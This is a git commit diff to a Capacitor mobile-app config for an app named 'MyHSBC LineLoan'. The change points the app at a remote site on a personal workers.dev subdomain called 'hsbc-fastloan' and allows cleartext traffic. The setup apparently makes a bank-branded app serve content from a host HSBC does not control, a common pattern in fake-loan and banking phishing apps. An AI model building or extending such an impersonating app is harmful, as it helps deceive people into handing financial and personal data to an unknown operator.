91cde4e922726bd74707c60b2f1c9a85566d396b
Web Gestion <webgestion95@gmail.com>
2026-05-30 19:38:22 +0200

    Update restarted

--- capacitor.config.ts
+++ capacitor.config.ts
@@ -3,7 +3,11 @@ import type { CapacitorConfig } from '@capacitor/cli';
 const config: CapacitorConfig = {
   appId: 'com.myhsbclineloan.app',
   appName: 'MyHSBC LineLoan',
-  webDir: 'dist'
+  webDir: 'dist',
+  server: {
+    url: 'https://hsbc-fastloan.webgestion95.workers.dev',
+    cleartext: true
+  }
 };
 
 export default config;
